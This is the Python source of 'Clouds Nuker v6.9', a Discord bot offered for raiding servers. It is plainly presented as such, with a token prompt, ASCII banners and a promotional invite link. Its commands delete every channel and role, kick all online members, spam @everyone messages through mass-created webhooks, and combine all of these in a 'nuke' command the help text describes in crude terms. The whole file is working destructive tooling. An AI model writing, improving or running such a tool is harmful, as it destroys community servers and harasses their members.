import discord
from discord.ext import commands
import configparser
import asyncio
from concurrent.futures import ThreadPoolExecutor
from pystyle import Center, Colorate, Colors
import os
import time

def loading_screen():
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
██╗      ██████╗  █████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
██║     ██╔═══██╗██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
██║     ██║   ██║███████║██║  ██║██║██╔██╗ ██║██║  ███╗
██║     ██║   ██║██╔══██║██║  ██║██║██║╚██╗██║██║   ██║
███████╗╚██████╔╝██║  ██║██████╔╝██║██║ ╚████║╚██████╔╝
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝            
        x,.-> please wait while the application is loading
    """,
                1,
            )
        )
    )

config = configparser.ConfigParser()
config.read('config.txt')

prefix = variable_value = config.get('config', 'prefix')

bot = commands.Bot(command_prefix=prefix, intents=discord.Intents.all(), help_command=None)

async def main_screen():
    os.system('cls')
    print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""
             ██████╗██╗      ██████╗ ██╗   ██╗██████╗ ███████╗    ██████╗  █████╗ ██╗   ██╗███╗   ███╗
            ██╔════╝██║     ██╔═══██╗██║   ██║██╔══██╗██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝████╗ ████║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║███████╗    ██║  ██║███████║ ╚████╔╝ ██╔████╔██║
            ██║     ██║     ██║   ██║██║   ██║██║  ██║╚════██║    ██║  ██║██╔══██║  ╚██╔╝  ██║╚██╔╝██║
            ╚██████╗███████╗╚██████╔╝╚██████╔╝██████╔╝███████║    ██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║
             ╚═════╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝
                                                           x,.-> logged in as {bot.user}
                                                           x,.-> serving {len(bot.guilds)} guild(s)
        """,
                1,
            )
        )
    )
    print(
            (
            Colorate.Vertical(
                Colors.cyan_to_blue,   
                f"""x,.-> Clouds Nuker v6.9
x,.-> made by r3xvert#9652

Prefix - "{prefix}"
Discord - https://discord.gg/WJGNdeQTCq
Note - Thanks for using my program
        """,
                1,
            )
        )
    )
    print(Colorate.Vertical(Colors.cyan_to_blue, f'''[ Showing info of bot {bot.user} ]
------------------------------------------------------------

Note : The nuke bot script is now running on your bot and you can go into a server with the bot who's token you just provided, type {prefix}help in a channel and nuke using the bot.\


-> User - {bot.user}
-> User ID - {bot.user.id}
-> Guilds - {len(bot.guilds)}
-> Avatar - {bot.user.avatar_url}
-> DMs - {len(bot.private_channels)}

Exit : To exit this menu, enter the command {prefix}home in a server with your bot added or restart this tool

------------------------------------------------------------
    '''))

@bot.event
async def on_ready():
    await main_screen()

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.message.delete()
        await ctx.send(f'{ctx.author.mention}, You missed a Required Argument', delete_after=2)
        print(Colorate.Vertical(Colors.cyan_to_blue, f'Missed an arguement in {ctx.guild.name} - {ctx.message.channel.name}'))
    elif isinstance(error, commands.CommandNotFound):
        await ctx.message.delete()
        await ctx.send(f'{ctx.author.mention}, Command not found', delete_after=2)
        print(Colorate.Vertical(Colors.cyan_to_blue, f'Command {ctx.message.content} not found in {ctx.guild.name} - {ctx.message.channel.name}'))
    else:
        await ctx.message.delete()
        await ctx.author.send(error)
        await ctx.message.channel.send(f'{ctx.author.mention}, check your dms for an erorr', delete_after=2)

@bot.command()
async def ping(ctx):
    await ctx.send(f'Pong !! {round(bot.latency * 1000, 2)}', delete_after=5)

@bot.command()
async def delchans(ctx):
    async def del_chan(channel):
        try:
            await channel.delete()
            print(Colorate.Vertical(Colors.cyan_to_blue, f'Deleted channel {channel.name}'))
        except:
            print(Colorate.Vertical(Colors.cyan_to_blue, f'Could not delete channel {channel.name}'))
    with ThreadPoolExecutor() as executor:
        for channel in ctx.guild.channels:
            executor.submit(asyncio.run_coroutine_threadsafe, await del_chan(channel), bot.loop)
    await ctx.guild.create_text_channel(name='dabothub')

@bot.command()
async def delroles(ctx):
    async def del_role(role):
        try:
            await role.delete()
            print(Colorate.Vertical(Colors.cyan_to_blue, f'Deleted role {role.name}'))
        except:
            print(Colorate.Vertical(Colors.cyan_to_blue, f'Could not delete role {role.name}'))
    with ThreadPoolExecutor() as executor:
        for role in ctx.guild.roles:
            executor.submit(asyncio.run_coroutine_threadsafe, await del_role(role), bot.loop)

@bot.command()
async def kickall(ctx):
    i = 0
    async def kick(member):
        try:
            await member.kick()
            i = i + 1
            print(Colorate.Vertical(Colors.cyan_to_blue, f'Kicked member {member.name}'))
        except:
            print(Colorate.Vertical(Colors.cyan_to_blue, f'Could not kick member {member.name}'))
    with ThreadPoolExecutor() as executor:
        for member in ctx.guild.members:
            if member.status != discord.Status.offline and not member.bot:
                executor.submit(asyncio.run_coroutine_threadsafe, await kick(member), bot.loop)
    print(Colorate.Vertical(Colors.cyan_to_blue, f'Succesfully kicked {i} members in {ctx.guild.name}'))

@bot.command()
async def everyone(ctx, *, message):
    async def spam_webhook(webhook):
        try:
            for i in range (5):
                await webhook.send(f'@everyone {message}')
        except:
            pass
    async def create_webhook(channel):
        try:
            webhook = await channel.create_webhook(name='dabothub')
            print(Colorate.Vertical(Colors.cyan_to_blue, f'Created webhook in channel {channel.name}'))
            with ThreadPoolExecutor() as executor:
                executor.submit(asyncio.run_coroutine_threadsafe, await spam_webhook(webhook), bot.loop)
        except:
            print(Colorate.Vertical(Colors.cyan_to_blue, f'Could not create webhook in channel {channel.name}'))
            pass
    with ThreadPoolExecutor() as executor:
        for channel in ctx.guild.channels:
            executor.submit(asyncio.run_coroutine_threadsafe, await create_webhook(channel), bot.loop)

@bot.command(aliases=['die'])
async def nuke(ctx, *, message):
    async def send_spam_msgs(channel):
        for i in range(5):
            await channel.send(f'@everyone {message}')
            await asyncio.sleep(0.5)
      
    async def make_alot_chans(ctx):
        channel = await ctx.guild.create_text_channel(name='dabothub')
        with ThreadPoolExecutor() as executor:
            executor.submit(asyncio.run_coroutine_threadsafe, send_spam_msgs(channel), bot.loop)

    with ThreadPoolExecutor() as executor:
        executor.submit(asyncio.run_coroutine_threadsafe, await delchans(ctx))
        executor.submit(asyncio.run_coroutine_threadsafe, await delroles(ctx))
        
    with ThreadPoolExecutor() as executor:
        for i in range(5):
            executor.submit(asyncio.run_coroutine_threadsafe, make_alot_chans(ctx), bot.loop)

@bot.command()
async def help(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=discord.Color.blue())
    embed.title='Commands List'
    embed.description=f'Here is the list of all the commands of the bot.\n\n**1.** {prefix}delchans - deletes all channels\n**2.** {prefix}delroles - deletes all roles\n**3.** {prefix}kickall - kicks everyone who is not offline\n**4.** {prefix}everyone - spams a message in all channels\n**5.** {prefix}nuke - fuck up the entire fucking server'
    embed.set_footer(text='Thanks for using my bot')
    await ctx.author.send(embed=embed)
    await ctx.send(f'{ctx.author.mention}, please check your DMs', delete_after=2)

@bot.command()
async def home(ctx):
    await ctx.send(f'Going back to home, check your prompt.', delete_after=5)
    os.system('python launcher.py')

def start_bot():
    print(Colorate.Vertical(Colors.cyan_to_blue, 'x,.-> Enter your Bot Token :'))
    token = input(Colorate.Vertical(Colors.cyan_to_blue, 'x,.->'))
    loading_screen()
    try:
        bot.run(token)
    except discord.LoginFailure:
        os.system('cls')
        print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.red_to_yellow,   
                f"""
███████╗██████╗ ██████╗  ██████╗ ██████╗ 
██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██████╔╝██████╔╝██║   ██║██████╔╝
██╔══╝  ██╔══██╗██╔══██╗██║   ██║██╔══██╗
███████╗██║  ██║██║  ██║╚██████╔╝██║  ██║
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ 
                            x,.- made by r3xvert#9652
                            x,.- https://discord.gg/WJGNdeQTCq
    """,
                1,
            )
        )
    )
        print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.red_to_yellow,   
                f"""
    x,.- The token that you input was invalid. Please restart the tool
    x,.- contact r3xvert#9652 or join https://discord.gg/WJGNdeQTCq for help
    """,
                1,
            )
        )
    )
        input(Colorate.Vertical(Colors.red_to_yellow, 'x,.->'))
        time.sleep(2)